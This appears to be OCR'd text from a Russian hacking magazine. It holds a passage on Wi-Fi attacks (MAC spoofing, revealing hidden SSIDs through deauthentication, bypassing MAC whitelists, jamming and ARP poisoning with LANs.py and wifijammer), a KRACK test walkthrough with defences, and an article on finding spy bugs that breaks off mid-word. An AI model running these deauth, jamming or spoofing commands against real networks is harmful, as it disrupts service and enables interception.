   Чтобы задать MAC для проводного интерфей са, добавляй такие строки:


[connection]
ethernet.cloned‐mac‐address=<новый MAC>

Чтобы задать MAC для беспро водного соединения — вот такие:


[connection]
wifi.cloned‐mac‐address=<новый MAC>

Вместо <новый MAC>, естественно, следует написать нужный MAC‐адрес.
И конечно, можно задать настройки для проводного и беспроводного соеди‐
нения одновременно.
  Обрати внимание, что при использовании этого метода MAC будет изме‐
няться только после того, как ты подключишься к сети. До этого у интерфей‐
сов будут их исходные адреса. Исключением может быть Wi‐Fi, если ты уже
настроил спуфинг, как показа но выше. Для отмены спуфинга добавляй в кон‐
фиг такие строки:


[device]
wifi.scan‐rand‐mac‐address=no

И перезапускай службу, чтобы изменения всту пили в силу.


ДРУГИЕ СПОСОБЫ ПРОГРАММНО ПОМЕНЯТЬ MAC
Менять MAC умеет не только NetworkManager. На самом деле сущес твует
много способов сделать это при помощи как сторонних программ, так и сис‐
темных служб. Чтобы мы могли отслеживать результаты, измени настройки
NetworkManager:


[device]
wifi.scan‐rand‐mac‐address=no

Теперь он не будет спу фить MAC во время сканирования беспроводных
сетей.
  Поскольку в настрой ках NetworkManager не заданы параметры ethernet.
cloned‐mac‐address и wifi.cloned‐mac‐address, будет использоваться
значение по умол чанию (preserve), даже если MAC был изменен другими
программами.
  Примеры дальше я буду выполнять в  Kali Linux и менять настройки
для адаптера Wi‐Fi. Осо бенность всех этих способов в том, что изменения
будут теряться после перезагрузки системы либо после переподключения
адаптера.


Из менение MAC с помощью iproute2
Мы будем исполь зовать прог рамму ip, которая включена в пакет iproute2.
Начнем с проверки текущего MAC:


$ ip link show

На выходе после слов link/ether ты увидишь MAC‐адрес. Первым делом
выключаем соответствующий интерфейс. У меня это wlan0.


$ sudo ip link set dev wlan0 down

Далее мы переходим непос редственно к спу фингу MAC. Ты можешь задать
любое значение, но помни, что сеть может быть настроена так, чтобы адре са
не выдавались, если MAC не соответс твует устройству какого‐то известного
производителя. Поэтому в качес тве первых трех бай тов лучше взять извес‐
тный префикс и изменять только вторые три бай та.
  Для изменения MAC выполняем команду


$ sudo ip link set dev <интерфейс> address <MAC>

Значения подставь свои.
  Последним шагом мы воз вра щаем интерфейс в состояние up:


$ sudo ip link set dev <интерфейс> up

Ну и для проверки изменений можешь написать


$ ip link show <интерфейс>

Значение link/ether должно быть таким, как ты устанавливал.


Из менение MAC с помощью macchanger
Еще один вариант — использовать программу macchanger. Тут есть воз‐
можность и создать MAC как у оборудо вания какого‐то определенного про‐
изводителя, и полностью рандомизировать. В Kali эта утилита стоит по умол‐
чанию.
  В момент смены MAC, как и при дру гих способах, устройство не должно
использоваться, поэтому выключай его:


$ sudo ip link set dev <интерфейс> down

Дальше в качестве интерфейса у меня будет wlan0, меняй его на свой
при необходимости.
   Чтобы узнать значения MAC, мож но запус тить утилиту с опцией ‐s:


$ sudo macchanger ‐s wlan0

В результате она выдаст текущий MAC и тот, что про шит в устройстве (на слу‐
чай, если они не совпадают), а также укажет вендора. Например:



  Current MAC: 00:c0:ca:96:cf:cb (ALFA, INC.)
  Permanent MAC: 00:c0:ca:96:cf:cb (ALFA, INC.)


Чтобы поменять MAC на совершенно про извольный адрес, есть опция ‐r:


$ sudo macchanger ‐r wlan0

На выходе к двум строкам выше добавится новый адрес.
   Чтобы рандомизировать MAC, не меняя первые три байта (префикс про‐
изводителя), есть опция ‐e:


$ sudo macchanger ‐e wlan0

Ну и если ты хочешь сам задать новый MAC, используй ‐m:


$ sudo macchanger ‐m <MAC> wlan0

Вместо <MAC> подставь нужный адрес.
  И наконец, чтобы вернуть исходный MAC, есть опция ‐p:


$ sudo macchanger ‐p wlan0


ОБНАРУЖЕНИЕ СКРЫТОГО SSID
Некоторые владельцы хотспо тов нас тра ивают их так, чтобы те не трансли‐
ровали свое название (ESSID). Делается это обычно в качестве допол нитель‐
ной меры безопасности. Пользователи не будут видеть такую сеть в списке
доступных, а для подключения требуется наб рать название вручную.
   Это слабенькая защитная мера, потому что в определенные моменты ES‐
SID все же транслируется в открытом виде.


По лучаем скры тый SSID при помощи Airodump-ng
Поймать ESSID в эфире можно во время подклю чения клиента, а для этого
нужно либо подождать, пока это произойдет естес твенным образом, либо
форсировать процесс, отключив всех от точки доступа. Это называется
деаутентификацией. Потерявшие связь клиенты начнут на автомате подклю‐
чаться заново, и имя сети прос кочит в открытом виде.
  Первым делом запускаем airodump:


$ airodump‐ng <интерфейс>

Когда он запалит новую сеть, ты увидишь ВSSID, длину наз вания и исполь‐
зуемый канал. Например, если сеть работает на первом канале, указываем
его:


$ airodump‐ng wlan0 ‐‐channel 1

Точно так же, как при перехвате рукопожатия, мож но задать ключ ‐w и за
ним — префикс име ни файла. Захват рукопожатия не мешает выявлению
скрытой точки. Дальше можно либо просто подождать, пока кто‐то подклю‐
чится, либо деаутентифицировать всех клиентов:


$ aireplay‐ng ‐0 3 ‐a <BSSID> wlan0

Здесь ‐0 означает мас совую деаутентифика цию, 3 — количество отправ‐
ленных пакетов.
  Результат поступит практичес ки мгновенно, и ты увидишь строку с пол ным
названием скрытой точки доступа.


ОБХОД MAC-ФИЛЬТРАЦИИ ПУТЕМ ЗАИМСТВОВАНИЯ АДРЕСА ИЗ
БЕЛОГО СПИСКА
В решении этой задачи нам снова поможет Airodump‐ng. Переводим адаптер
в режим мониторинга и выполняем такие команды:


$ ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig
wlan0 up
$ airodump‐ng wlan0

Ты увидишь список сетей, количество подключенных клиентов и их MAC‐адре‐
са, которые можно присвоить своему адаптеру, если в сети настроена филь‐
трация по белым спискам.
  Бывает и так, что сразу клиентов у определен ных точек доступа не видно,
поскольку программа соб рала недостаточно сведений. В этом случае тебе
опять же поможет деаутентификация. Если у хот спота есть хоть один клиент,
ты это сразу увидишь пос ле переподключения. А заодно можно и перех‐
ватывать хендшейки.
  Для деаутентификации останавлива ем Airodump‐ng и запускаем снова,
только уже с указанием канала интересу ющей нас точки.


$ airodump‐ng wlan0 ‐‐channel 1

После этого шлем deauth‐пакеты и смотрим, что получится:


$ aireplay‐ng ‐0 5 ‐a <MAC> wlan0

После выполнения атаки будут рас крыты некоторые из ранее неизвестных
клиентов. Копируй MAC кого‐то из легитимных пользователей, записы вай
в настройки своей сетевой карты — и можешь проводить задуманную атаку.


ГЛУШЕНИЕ СЕТИ WI-FI
При пентесте бывает нужно заглушить какую‐то из точек доступа. Для этого я
рекомендую использовать утилиту LANs. Она умеет не только глу шить Wi‐Fi,
но и другие вещи: шпионит за пользователями, индивиду ально травит таб‐
лицы ARP целевой машины, роутера и при необ ходимости — сервера DNS.
  Радиус действия глушения сильно зависит от мощности адаптера, но у
скрипта есть настрой ки, которые поз воляют глушить всех подряд или только
одного клиента. Здесь все просто: качаем и ста вим зависимос ти и скачиваем
сам скрипт.


$ sudo apt install ‐y python‐nfqueue python‐scapy python‐twisted
nbtscan
$ git clone https://github.com/DanMcInerney/LANs.py.git
$ cd LANs.py/

Теперь можно запускать наш скрипт, что бы начать глушение.


$ python lans.py ‐u ‐p

Ключи ‐u и ‐p означают активное обнаружение цели для ARP‐спуфинга
и вывода всех интересных незашифрованных данных, которые они отправ‐
ляют или запрашивают. Опции ‐ip здесь нет, поэтому будет выполнено ARP‐
сканирование сети и его результаты будут сравниваться с результатами
живого «неразборчивого» захвата. В результате получится список всех кли‐
ентов сети.
  Нажимай Ctrl + C для остановки поиска, когда пос троишь карту сети и пос‐
мотришь списки подключенных клиентов. Для тех же целей, кстати, можно
успешно использовать Nmap.
   Точечный вариант глушения будет выглядеть так:


$ python lans.py ‐‐jam ‐‐accesspoint <MAC роутера> ‐s <MAC для
пропуска>

Здесь:
 • --jam — глушить все или некото рые бес проводные точки 2,4 ГГц и кли‐
   ентов в пределах досягаемос ти; если необ ходимо, то вместе с этим мож‐
   но использовать допол нитель ные аргументы (ниже);
 • -s — так можно задать MAC, который не будет деавторизован;
 • --accesspoint — тут можно ввес ти MAC конкретной точки доступа,
   которая будет выступать в качестве цели.

Глушение всех сетей Wi‐Fi будет выглядеть так:


$ python lans.py ‐‐jam

Глушение только одной точки дос тупа:


$ python lans.py ‐‐jam ‐‐accesspoint <BSSID>

Здесь тоже можно задать некоторые дополнительные опции:
 • -ch — ограничить глушение одним каналом;
 • --directedonly — не отправлять пакеты деаутентификации на широко‐
  вещательные адреса точек дос тупа, а только парам из клиента и хотспота;
 • --accesspoint — так можно ука зать конкретную точку дос тупа в качестве
   цели.


ЕЩЕ ЭФФЕКТИВНЫЙ СКРИПТ ДЛЯ ГЛУШЕНИЯ WI-FI
Для глушения Wi‐Fi бывает удобно использовать утилиту wiﬁjammer. Она край‐
не  проста  в  исполь зовании,  так  что  обсуждать  здесь  почти  нечего:
без параметров она просто будет заглушать все, что найдет в радиусе
досягаемости адаптера. Чтобы не задеть сво их, можно исключить некоторые
MAC‐адреса с опцией ‐s.
   Устанавливаем wiﬁjammer:


$ git clone https://github.com/DanMcInerney/wifijammer.git
$ cd wifijammer/
$ sudo python2 wifijammer.py ‐‐help

И запускаем:


$ sudo python2 wifijammer.py ‐s <MAC для исключения>

На этом все! Надеюсь, ты нашел что‐то новое и интересное среди показан‐
ных мной фишек и тебе это пригодится в работе.
COVERSTORY
 KRACK
 НА ПРАКТИКЕ





      КАК РАБОТАЕТ АТАКА НА WI‐FI
    С ПРИМЕНЕНИЕМ НАШУМЕВШЕЙ
              ТЕХНИКИ





Осенью 2017 года мир узнал о новой угро‐
зе безопасности сетей  Wi‐Fi. Она  зат‐
рагивает абсолютно все устройства и прог‐
раммные платформы. Каким бы сложным
и длинным ни был пароль, это не поможет,          Иван Пискунов
потому что KRACK — уязвимость самого
протокола обмена ключами шифрования
WPA2. В  этой  статье мы  разберемся
в теории бага и попробуем испытать его
на практике.


Исто рия уяз вимос ти
16 октября 2017 года была рас крыта информация о критических проблемах
WPA2, которые позволя ют обойти защиту и в резуль тате прос лушивать тра‐
фик Wi‐Fi, передаваемый между точкой дос тупа и компьютером.
  Комплекс уязвимостей в WPA2, получивший название KRACK (аббре виату‐
ра от Key Reinstallation Attacks), был обнаружен сводной группой исследова‐
телей из разных университетов и компаний.
   Руководитель группы Мэти Ванхоф рас ска зал, что ему удалось найти
проблемы, из которых формиру ется KRACK, еще в 2016 году, но он более
года совершенствовал свою ата ку. Исследова тель сообщил об уязвимостях
некоторым  производителям  и  представителям  организации  US‐CERT
в июле 2017 года, а в августе поделился информацией о проблемах
с широким кругом вендоров.
  Производители оборудования поспешили выпустить патчи прошивки,
которые устраняют уязвимости, но, как всег да быва ет в таких случаях, оста‐
ется огромное число необновленных устройств.



ПРИНЦИП ДЕЙСТВИЯ
В основе атаки лежит уяз вимость четырехэлементно го хендшей ка WPA2. Этот
хендшейк выполняется тогда, когда клиент хочет подключиться к защищенной
сети Wi‐Fi. В процессе подтверждается, что обе стороны (клиент и точка дос‐
тупа) обладают корректными учетными данными. В то же время хендшейк
используется для согласования свежего ключа шифрования, который впос‐
ледствии будет применяться для защиты тра фика.
  Злоумышленник может устроить ата ку типа man in the middle и принудить
участников сети реинсталлировать ключи шифрования, которые защищают
трафик WPA2. К тому же, если сеть нас троена на использование WPA‐TKIP
или GCMP, злоумышленник сможет не только прос лушивать трафик WPA2,
но и инжектить пакеты в данные жертвы.
   Эксплуатируя эту критическую ошибку, можно добиться расшифровки тра‐
фика, сделать HTTP‐инжекты, перехватить TCP‐соединения и многое другое.
  От KRACK может защитить использование HTTPS, однако далеко не всег‐
да. Дело в том, что сам HTTPS нельзя назвать абсолютно безопасным (к при‐
меру, существуют методики даунгрейда соединения), хотя он и станет допол‐
нительным слоем шифрования.
  Метод универсален и работа ет против любых незапатченных устройств,
подклю ченных к Wi‐Fi. Главное усло вие заключа ется в том, что атакующему
придется находиться в зоне действия атакуемой сети Wi‐Fi, то есть атаку
нельзя провести удаленно.





            Мэти Ванхоф демонстрирует уяз вимость


Уяз вимос ти, вошед шие в сос тав KRACK
 • CVE‐2017‐13077: reinstallation of the pairwise encryption key (PTK‐TK) in the
   4‐way handshake.
 • CVE‐2017‐13078: reinstallation of the group key (GTK) in the 4‐way handshake.
 • CVE‐2017‐13079: reinstallation of the integrity group key (IGTK) in the 4‐way
   handshake.
 • CVE‐2017‐13080:  reinstallation of the group key (GTK)  in the group key
   handshake.
 • CVE‐2017‐13081: reinstallation of the integrity group key (IGTK) in the group key
   handshake.
 • CVE‐2017‐13082: accepting a retransmitted Fast BSS Transition (FT) Reassoci‐
   ation Request and reinstalling the pairwise encryption key (PTK‐TK) while pro‐
   cessing it.
 • CVE‐2017‐13084: reinstallation of the STK key in the PeerKey handshake.
 • CVE‐2017‐13086:  reinstallation  of the Tunneled  Direct‐Link Setup (TDLS)
   PeerKey (TPK) key in the TDLS handshake.
 • CVE‐2017‐13087: reinstallation of the group key (GTK) when processing a Wire‐
   less Network Management (WNM) Sleep Mode Response frame.
 • CVE‐2017‐13088: reinstallation of the integrity group key (IGTK) when process‐
   ing a Wireless Network Management (WNM) Sleep Mode Response frame.




ЭКСПЛУАТАЦИЯ
Для  демонстрации  уяз вимости  нам  понадобится  оборудование —
как минимум один, а лучше несколько USB Wi‐Fi‐адаптеров, совместимых
с Kali Linux. Мой выбор пал на TP‐Link N150 Wireless High Gain USB Adapter
(TL‐WN722N), он уже протес тирован и хорошо совместим с моим дистри‐
бутивом. Но ты можешь использовать и любой дру гой на свой вкус.
  Зачем нам вооб ще этот «свисток», если у ноутбука есть адаптер Wi‐Fi?
Отдельное устрой ство для вардрайвинга рекомендуется не только потому,
что на него меньше наводок и у него более силь ная антенна, но еще и из
соображений удобства. Со встроенного адаптера Wi‐Fi можно парал лельно
выходить в интернет, а это довольно важная возможность.
  В общем, с TP‐Link мы и поднимем свою фейковую (или, если угодно, тес‐
товую) сеть и будем проворачивать в ней наш эксперимент.


Под нимем Wi-Fi на Kali Linux
Итак, загружаем Kali и идем в таскбар (правый верхний угол рабочего стола),
поднимаем Wi‐Fi‐адаптер (то есть вклю чаем его) и коннектимся к заранее
заготовленной сети.
  Ключ шифрования у нас WPA2‐Personal, и сра зу договоримся исполь‐
зовать длинный и надежный пароль. Сеть, к которой мы будем под ключаться,
у меня называется SKG2.





                 Коннектимся к сети с именем SKG2





                 Свойства беспроводной сети SKG2


Инстал лиру ем инстру мен тарий Krack Attack
Сначала нам нужно убе диться, что все необ ходимые зависимости для инстру‐
ментария Krack Attack у нас в системе есть. Выполним такую команду:


$ sudo apt‐get install libnl‐3‐dev libnl‐genl‐3‐dev pkg‐config
libssl‐dev net‐tools git sysfsutils python‐scapy python‐pycryptodome





               Ин сталляция пакетов для Krack Attack

Поскольку в самом Kali Linux по умол чанию нет инстру ментов для воспро‐
изведения нужной нам атаки, мы идем на GitHub и скачиваем там набор
скриптов.


$ git clone https://github.com/vanhoefm/krackattacks‐scripts.git





             Ин сталляция инстру ментария Krack Attack

Дальше нам для чистоты эксперимен та нужно отключить аппаратное
шифрование (hardware encryption). То есть шифровать ключи будем только
программными средствами, вшитыми в протоколы Wi‐Fi. Для этого перехо‐
дим в директорию с Krack Attack:


$ cd krackattacks‐script

И там запускаем конфигурационный скрипт:


$ sudo ./krackattack/disable‐hwcrypto.sh.root





  Запускаем конфигура ционный скрипт, чтобы отклю чить аппаратное шиф‐
  рование

Дальше нам нужно отклю чить Wi‐Fi в сетевом менеджере Kali, то есть отклю‐
читься от сети SKG2. Это позволит начать собс твенную трансляцию в новой
сетке WLAN0, где мы и проведем атаку.





Следующим шагом создаем тестовую сеть Wi‐Fi с помощью TP‐Link N150.
Однако для начала нам нужно убедиться, что наше железо не заблокировано.
А выясним мы это с помощью утилиты rfkill, наб рав следующую команду:


$ sudo rfkill unblock wifi

После того как создана тестовая сеть, мы используем сценарий krack‐test‐
client.py. Этот скрипт на Python будет про верять все устройства, подклю‐
чающиеся к нашей сети Wi‐Fi, на уязвимость «атаки переустановки ключей»
(именно так официально называется этот метод).
   Итак, создаем сетку. Скомпилируем наш модифицированный экземпляр
hostapd. Если ты не в курсе, hostapd — это демон (служба) беспроводной
точки доступа в Linux.


$ cd ../hostapd
$ cp defconfig .config
$ make ‐j 2

Отключим аппаратное шифрование для нашей фейковой сети следующей
командой (запускаем все тот же конфигура ционный скрипт):


$ cd ../krackattack/
$ sudo ./disable‐hwcrypto.sh

Вообще‐то после того, как скрипт отра бота ет, нужно перезагрузиться (так
советуют разработчики инстру мента). Но у меня все работало и без ребута.
Но если что‐то пойдет не так, перезагружай тачку.
  После перезагрузки (или без) выпол няем команду


$ sudo ./krack‐test‐client.py

Это тот самый скрипт на Python, который поз волит переустановить ключи
в четырехстороннем рукопожатии и автоматически создаст сеть. Использует‐
ся метод шифрования WPA2‐Personal, а SSID будет testnetwork.





          Результат работы скрипта — тес товая сеть создана!


Атака
Теперь берем ноут с Windows 10 и цепляемся на нем к сети testnetwork.
Вводим наш очень сложный и длинный пароль и удос товеряемся, что коннект
произошел.





После того как ноут с Windows 10 ока зался в тес товой сети, в терминале Kali
мы получаем оповещения от скрипта krack‐test‐client.py, который пыта‐
ется просканировать подключенный клиент (наш ноутбук) на уяз вимость и,
если найдет ее, проэксплуатировать.
  Но результат пока грус тный. У Windows 10, конечно же, есть патч, о чем
гласит строчка Client DOESN’T seem vulnerable to pairwise key reinstallation
in the 4‐way handshake.





         Скрипт сооб щает, что наш клиент неуязвим перед KRACK

Попробуем еще несколько вариантов, задаваемых ключами к скрипту.


$ sudo ./krack‐test‐client.py ‐‐group
$ sudo ./krack‐test‐client.py ‐‐tptk
$ sudo ./krack‐test‐client.py ‐‐tptk‐rand

Но конечно же, ничего не срабатывает. Неужели мы зря столько старались?
  Не зря! Я без труда нашел у себя уязвимое устройство — им оказал ся
телефон с Android 7.0, который последний раз обновлялся в июле 2018 года.
Такие наверняка еще можно встретить.





     Информация о пакетах обновления для смартфона на Android 7

Коннектим смартфон к testnetwork и смотрим, что нам скажет наш скрипт.
Несколько секунд ожидания, и он сооб щает, что Android уязвим для груп‐
повой переустановки клю чей в четырехстороннем рукопожатии.





                         Android 7 оказал ся уязвим

Мы достигли результата! Дальше можно открывать, к при меру, Wireshark
и снифить пакеты. В целом эксперимент показал, что KRACK — это пока что
вполне реальная проб лема и атака работа ет.


КАК ЗАЩИТИТЬСЯ?
Получается, что почти каждое устройство почти в любой сети Wi‐Fi можно
взломать при помощи KRACK. Зву чит страшновато, но — как и в слу чае
с любой другой атакой — это еще не конец света. Вот пара советов,
как защититься от KRACK:
 • во‐первых, всегда про веряй, чтобы в адресной строке браузера была
   зеленая иконка замка. Если используется HTTPS, значит, KRACK не поз‐
   волит расшифровать трафик;
 • во‐вторых, обязательно ставь последние обновления безопасности.

И конечно, для критичных сессий ты можешь не доверять беспроводному
соединению вообще. Или используй VPN: с ним у тебя будет сквозное шиф‐
рование между клиентом и сервером.


Поможет ли WPA3 от KRACK?
27 июня 2018 года альянс Wi‐Fi объявил об окончании раз работки нового
стандарта безопасности — WPA3. Это одновременно и новый протокол
безопасности, и название соответс твующей прог раммы сертификации.
  Создатели WPA3 попытались устранить концептуальные недоработки,
которые всплыли с появлением KRACK. Посколь ку клю чевая уяз вимость скры‐
валась в четырех стороннем рукопо жатии, в WPA3 добавилась обязательная
поддержка более надеж ного метода соеди нения — SEA, также известного
как Dragonﬂy.
   Технология SEA (Simultaneous Authentication of Equals) уже применялась
в mesh‐сетях и описана в стандарте IEEE 802.11s. Она основана на протоколе
обмена ключами Диффи — Хеллма на с использованием конечных цикличес‐
ких групп.
  SEA относится к протоко лам типа PAKE и предоставляет интерактивный
метод, в соответствии с которым две и более стороны устанавливают крип‐
тографические клю чи, основанные на зна нии пароля одной или несколькими
сторонами. Результирующий ключ сессии, который получает каждая из сто‐
рон для аутентификации соединения, выбирается на основе информации
из пароля, клю чей и MAC‐адресов обеих сторон. Если ключ одной из сторон
окажется скомпрометирован, это не повлечет компрометации ключа сессии.
И даже узнав пароль, атакующий не сможет рас шифровать пакеты.
  Еще одним новшеством WPA3 будет поддержка PMF (Protected Manage‐
ment Frames) для контро ля целостности тра фика. Но в будущем поддержка
PMF станет обязательной и для WPA2.
  Однако то, что WPA3 обратно совместим с WPA2, уже вызвало кри тику
Мэти Ванхофа, автора атаки KRACK. Он уверен, что найдется способ обхода
PMF для принудительного отсоединения клиента от сети.
  Внедрение SEA хоть и усложнит проведение словарных атак, но не исклю‐
чит их и лишь сделает более длительными, а для обхода защиты в открытых
сетях  атакующий по‐прежнему сможет развернуть свою  точку доступа
и перехватывать трафик.
  К тому же WPA3 дол жен быть реализован в устройстве аппаратно, и прос‐
тым обновле нием его поддержку добавить нель зя. Соответственно, на внед‐
рение уйдут долгие годы, а исследователи ИБ не сидят сложа руки.
ВЗЛОМ





                                                                                            atreau
                                                                                             zinik.alexander@gmail.com
        ОХОТА
     НА ЖУЧКА
                   КАКИМИ БЫВАЮТ
            ШПИОНСКИЕ УСТРОЙСТВА
                   И КАК ИХ ИСКАТЬ




Может показаться, что жучки из шпионских фильмов —
это что‐то несовременное. Зачем сложности, если мик‐
рофоны и камеры и так повсюду — в ноутбуках, смартфонах
и прочих девайсах? Однако получить доступ к ним может
быть сложнее, чем доступ к физическому пространству,
в котором они находятся. Тут‐то на сце ну и выходит арсенал
миниатюрных,  труднозаметных  и  вполне  современных
устройств. Давай разберемся, сто ит ли их бояться, и если
да, то какие меры безопасности можно предпринять.


ТРЕЗВОМЫСЛИЕ И БДИТЕЛЬНОСТЬ
Задумавшись, не сле дит ли кто за тобой, очень легко впасть в паранойю. Мы
семимильными шагами движемся в сто рону «проз рачного» общества, так что
совершенно точно кто‐то когда‐то за тобой следит. Чтобы не сойти с ума,
нужно сконцентрироваться на практичес ком подходе к вопросу: когда слежка
за мной может оказаться мне невыгодна, а кому‐то выгодна?
  К сожалению, если ты занимаешь ся биз несом, хоть сколько‐то знаменит
или работаешь с коммерческой тайной, ты находишь ся в потенциальной зоне
риска. Стоит упомянуть и курь езные, но малоприятные истории про скры тые
камеры в съемных квартирах Airbnb или в общественных душевых, раздевал‐
ках, туалетах. Скрытая камера, следящая за кла виатурой банкомата (или
любого другого места, где вво дят пароль на клавиатуре), также может
облегчить жизнь зло умыш ленникам.
   Так что первым делом прикинь, кто, зачем и как может действовать против
тебя. Возможно, в некоторых сценариях ата ки использование гаджетов
и вправду окажется практичным. Например, если кто‐то хочет следить за тво‐
ими передвижениями, то в его распоряжении разные способы — нанять час‐
тных детективов или получить дос туп к данным про вай деров и сотовых опе‐
раторов. Но исполь зовать GPS‐трекер может ока заться дешевле, проще
и удобнее.


Проб лемы выбора
Если вдруг после проч тения этой статьи тебе захотелось почувствовать себя
супершпионом, то независимо от того, есть ли у тебя дурные намерения,
или ты просто хочешь раз влечься, очень не советуем. В Российской Федера‐
ции существуют законы, которые запрещают про давать и покупать устрой‐
ства, предназначенные для тайного сбора информации. Формулировки
в законе размытые, а практика пра воп рименения включает в себя настолько
сомнительные истории, что Верховный суд даже выпустил специальное разъ‐
яснение, как не допускать зло употребления законо дательством.


После этого определи, в какой зоне нарушение информационной безопас‐
ности будет действитель но критичным, что бы сосредоточиться на ее защите
и не тратить чрезмерно много сил и ресурсов. Защитить все от всего невоз‐
можно и не нужно, вмес то этого стоит защищать действительно важное.
Переговорную комнату совета директоров или зону, в которой работают
над критично важным проектом, например. Или прос то кладовку, в которой ты
хранишь нечто, что не должно попадать ся на гла за людям, которые тебя
не любят.
  Не забывай, что один из важнейших инстру ментов хакера — социальная
инженерия. Так что нужно защищать ся и от нее. Если уж ты определился
со своим «защищенным периметром», то позаботь ся о том, чтобы люди,
в него допущенные, тоже были компетентны и заинтересованы в поддержа‐
нии безопасности. Помни, что никто не обра щает внимания на уборщиков
и ремонтников — им легче легкого уста новить скрытое устройство. Но и
абсолютно лояльный, но безалаберный коллега может прос то не заметить,
что кто‐то подложил ему в сумку или карман гаджет‐шпион.


ОТ ТЕОРИИ К ПРАКТИКЕ
Такое вступление перед обсуждением технических вопросов было необ‐
ходимо, потому что против некоторого лома нет приема, кроме пре дусмотри‐
тельности.
  Современный жучок‐микрофон может быть раз мером меньше флешки,
и если он просто записывает информацию, пока лежит у кого‐то в кармане, то
его можно обнаружить разве что высокочувствительным детектором на близ‐
кой дистанции. Он может выглядеть как угодно. Так что защищаться от него
нужно в первую оче редь нетехничес кими методами.
  Помни, что у любого шпионско го устройства есть сильные и слабые сто‐
роны. Так, у микрофона при всей его необ наружимости есть две очень важ‐
ные слабые стороны. Во‐первых, батарея: как бы она ни была хороша, даже
если устройство активиру ется, только когда есть звук, а остальное время
находится в спящем режиме — рано или поздно она сядет.
  И тут проявится и вто рая слабая сто рона: если у устройства нет передат‐
чика, то его придется не только подложить, но и забрать. А если его до этого
успеют обнаружить, то все старания внедрить жучка оказываются напрасны‐
ми, никакой информации получить не удастся.





  Вот так может выглядеть микрофон более‐менее серьезного жучка, а его
  более скромный товарищ с Aliexpress, скорее всего, будет прос то похож
  на флешку

Схожим образом дело обстоит и с видеока мера ми. Они тоже могут быть
очень компактными и хорошо замаскированными — вплоть до камеры
в бутылке с водой. Но у них больше слабос тей, чем у микрофонов, — вре мя
работы от аккумулятора меньше, и обязатель но присутс твует линза. Она
может быть очень малень кой, но все равно будет хоть немного, но бликовать,
если на нее попадет свет.
   Есть спе циальные приборы‐детекторы, которые обнаруживают подоз‐
рительные блики, но можно попробовать поискать камеру и с помощью обыч‐
ного фонарика. Чем меньше остального света, тем лучше — блики будут
заметнее.


             INFO

                     Заговорив о специальных приборах‐детекторах,
                       упомянем важную проблему рынка  устройств
                       для  скрытного  получения  информации  и  их
                      разоблачения. Заин тересовавшись ими, ты ока‐
                      зываешься между двух огней: Aliexpress с его
                      предложениями супердешевых и суперинноваци‐
                      онных гад жетов и специализированные магази‐
                        ны, предлагающие устройства от изготовителей
                        с опытом в много десяти летий. Обычно рек‐
                      ламируется повышенная  чувствительность и в
                     целом  зашкаливающая  крутость.  Но  никто
                      не гарантирует, что устройство в сто раз дороже
                        окажет ся в сто раз лучше.





  Объектив pinhole‐камеры с Aliexpress. Установить ее основную часть —
  задача не из элементарных

Обнаруживать жучки немного про ще, если их оператор тоже хочет облегчить
себе жизнь. Современные технологии сделали вполне дос тупны ми и устрой‐
ства, которые передают данные в реальном времени. Но законы физики
не обойти: если они что‐то переда ют, то можно обнаружить или заглушить
канал передачи.
  Самый обычный  канал переда чи — радиодиапазон,  то  есть  Wi‐Fi
или сотовые сети. Либо жучок использует уже доступный Wi‐Fi (например,
гостевую сеть), либо где‐то рядом для него будет организована точка дос‐
тупа — обрати внимание на нез накомые и мощные раздачи сигнала рядом.
Если к твоим трем привычным соседям вдруг добавилась новая сеть Wi‐Fi —
возможно, там‐то и засели зло деи.
  Впрочем, с большой вероятностью устройство будет передавать данные
через сотовые сети — и здесь его помогут обнаружить детекторы радиосиг‐
нала. Но пользоваться ими нужно с умом. А именно — отключить все устрой‐
ства, которые используют беспроводные сети, чтобы было меньше посторон‐
них сигналов и боль ше шанс обнаружить спрятанного шпи она. Затем зай‐
мись методичным поиском. Ожидать, что ты просто нажмешь кнопку и гаджет
тут же раскроет тебе все сокрытое, нес колько наивно.


Как выбирать детек тор
От мощного разброса цен и обилия рекламы при выборе детектора могут
начать разбегаться глаза. Старайся внимательно смотреть, что берешь,
и изучай прежде всего техничес кие характеристики.





Например, вот этот детектор стоит 90 долларов и обещает час тотный диапа‐
зон от 1 до 6500 МГц, имеет вынос ную антенну и лазер для высвечивания
камер. Для любительского устройства это неплохие показатели и приемле‐
мая цена.


Методика работы с детектором принципиально не отличается от методики
простого осмотра. Обращай внимание на подозрительные признаки: царапи‐
ны, странные отверстия, загадочные предметы. Попробуй пос тавить себя
на место злоумышленника и проверь места, где ты бы сам что‐то спрятал.
Часто жучки помещают в предметы освещения или розетки — там можно вдо‐
бавок и бесперебойное питание устройству орга низовать. Ясное дело, если
видишь какие‐то непонятные провода — проверь, куда они ведут.
  И уж само собой разумеется — не поз воляй кому попало совать что
попало в USB‐пор ты систем, которые тебе дороги. Этот совет слегка выходит
за рамки статьи, потому что, получив дос туп к USB, можно уже и не ограничи‐
ваться слежкой на таком уровне. Но все‐таки сто ит упомянуть, что в обычном
USB‐проводе можно умес тить микрофон и сотовую антенну для передачи
информации.


ЭКЗОТИКА И ЭЗОТЕРИКА
Что ж, основные прин ципы понятны — но на случай, если твой интерес (и
паранойя)  от них  только раз горелся, упомянем еще пару интересных
устройств.
   Во‐первых, это направленные микрофоны. Строго говоря, это не жучки,
но эффект они могут дать схожий. Направлен ный микрофон может быть прос‐
то акустическим, с парабо лическим резонатором — такое технологичес ки
продвинутое «ухо» доступно любому желающему, например, нас ладиться
пением птиц, не потревожив их приближени ем. Само собой, от него защища‐
ют стены — но, если ты решил обсудить биз нес‐пла ны с коллегами на при‐
роде, лучше вспомни об этом устройстве.





  Параболический микрофон — стоимость удоволь ствия всего 30–40 дол‐
  ларов

С направленным микрофоном, в принципе, можно сравнить лазерный мик‐
рофон — он тоже нуждается в пря мой «линии слуха» до объекта, которая
может быть довольно длин ной. Но лазерный микрофон, наоборот, позволяет
подслушать, о чем говорят в закрытой комнате. Невидимый лазерный луч счи‐
тывает вибрации оконных стекол (а по некоторым анекдотичес ким данным —
может считать их и со стакана на столе) и по ним вос станавливает звук.
  Но не спеши напрягаться: лазерные микрофоны стоят действительно
дорого, десятки тысяч долларов, и нуждаются в очень профессиональном
операторе. А если до тебя решат добраться спецслуж бы, у них и без того хва‐
тает инструментов.
  Но если тебя очень манят дорогие игрушки, обрати внимание на штуку
под названием «нелинейный локатор» (nonlinear junction detector). Она излу‐
чает высокочастотные радиоволны, которые, встретив на своем пути любую
полупроводниковую электронику, воз вра щаются отраженными особым, гар‐
